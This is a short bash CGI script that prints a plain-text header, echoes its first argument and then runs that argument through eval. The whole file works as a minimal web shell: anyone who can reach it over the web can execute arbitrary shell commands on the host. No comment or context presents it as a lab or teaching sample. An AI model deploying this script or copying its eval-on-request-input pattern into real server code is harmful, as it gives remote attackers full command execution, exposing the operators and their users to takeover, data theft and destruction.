#!/bin/bash
echo "Content-type: text/plain"
echo ""
echo "${1}"
echo ""
eval "${1}"
